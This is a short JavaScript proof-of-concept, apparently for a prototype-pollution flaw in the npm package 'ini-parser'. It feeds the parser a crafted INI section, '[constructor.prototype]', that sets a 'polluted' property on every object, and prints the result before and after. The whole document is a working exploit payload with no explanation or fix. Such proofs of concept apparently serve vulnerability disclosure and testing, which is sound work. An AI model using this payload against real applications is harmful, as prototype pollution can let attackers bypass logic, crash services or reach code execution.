var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
let a = require('ini-parser');
a.parse('[constructor.prototype]\npolluted=yes');
console.log({}.polluted);